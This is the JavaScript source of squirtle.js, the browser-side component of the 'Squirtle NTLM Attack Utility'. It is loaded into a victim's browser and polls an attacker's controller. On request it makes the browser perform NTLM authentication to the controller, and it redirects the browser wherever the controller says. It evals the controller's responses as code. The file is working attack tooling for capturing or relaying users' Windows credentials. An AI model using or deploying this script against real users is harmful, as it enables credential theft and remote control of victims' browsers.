// Welcome to squirtle.js - part of the Squirtle NTLM Attack Utility
// This script is to be loaded on a client's web browser to control their
// activity in regards to NTLM authentication.
//
// Copyright (C) 2008  Kurt Grutzmacher
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

// Gobble gobble globals
var mTimer;   // Keepalive timer
var TimerLength = TIMEOUTVALUE; // How long to wait before keepalive?

// Hello, I am an initialization function.
function init() 
{
    if (arguments.callee.done) return;  // only init once
    arguments.callee.done = true;
    // Do a static authentication first
    getAuthURL("/client/auth/" + Math.random()*30 );
  
    // Set the timeout which will call keepalive() after it's hit
    mTimer = setTimeout ("keepalive()", TimerLength);
    UpdateStatus("Timer set. T-Minus " + TimerLength + " milliseconds");
}

// Keepalive / Controller communication
function keepalive() 
{
    UpdateStatus("Sending Keepalive");
    getStatus("/keepalive?random=" + Math.random()*20);  // Send keepalive to controller
}

// Debugug
function UpdateStatus(message) 
{
    document.getElementById('status').innerHTML = (new Date).toLocaleString() + " " + message;
}

// Talk to the controller
function getStatus(url) 
{
    var getFuncy = new XMLHttpRequest;
    if (getFuncy.readyState == XMLHttpRequest.DONE || getFuncy.readyState == XMLHttpRequest.UNSENT) 
    { // Can we receive updates?
        UpdateStatus("Sending " + url);
        getFuncy.open("GET", url, true);
        getFuncy.onreadystatechange = function() 
        {
            if (getFuncy.readyState == XMLHttpRequest.DONE) 
            {
                var response = eval("(" + getFuncy.responseText + ")");
                TimerLength = parseInt(response.keepalive); // Set a new timeout value if changed
                document.getElementById('messages').innerHTML = "Keepalive: " + TimerLength + "<br>" +
                    "URL: " + response.url + "<br>" +
                    "Refresh: " + response.refresh + "<br>" +
                    "Auth:" + response.auth + "<br>";
                if (response.auth) 
                {
                    alert('doing client auth per controller request');
                    getAuthURL("/client/auth/" + Math.random()*30 + "/");
                }
                if (response.refresh) 
                {
                    if (response.debug) alert('redirecting to new url: ' + response.url);
                    window.location = response.url;
                }
            }
        }
        getFuncy.send(null);
    }
    clearInterval(mTimer);
    mTimer = setTimeout ("keepalive()", TimerLength);
}

// I get URL, you get money. We both be happy.
function getAuthURL(url) 
{
    var getDown = new XMLHttpRequest;
    if (getDown.readyState == XMLHttpRequest.DONE || getDown.readyState == XMLHttpRequest.UNSENT) 
    { // Can we receive updates?
        UpdateStatus("Sending " + url);
        getDown.open("GET", url, true);
        getDown.onreadystatechange = function() 
        {
            if (getDown.readyState == XMLHttpRequest.DONE) 
            {
                var response = eval("(" + getDown.responseText + ")");
                UpdateStatus("Received authorization status: " + response.status);
            }
        }
        getDown.send(null);
    }  
    clearInterval(mTimer);
    mTimer = setTimeout ("keepalive()", TimerLength);
}

XMLHttpRequest.onreadystatechange	= function() 
{
	fReport(this, 'readystatechange [' + this.readyState + ']', []);
}
XMLHttpRequest.onopen	= function(sMethod, sUrl, bAsync) 
{
	fReport(this, 'open', [sMethod, sUrl, bAsync]);
}
XMLHttpRequest.onsend	= function(vData) 
{
	fReport(this, 'send', [vData]);
}
XMLHttpRequest.onabort	= function() {
	fReport(this, 'abort', []);
}

function fReport(oSelf, sAction, oArguments) 
{
	var oElement = document.getElementById("log").appendChild(document.createElement("xmp"));
	oElement.innerHTML	= new Date() + ' - Called "' + sAction + '" with arguments: (' + oArguments + ')';
}
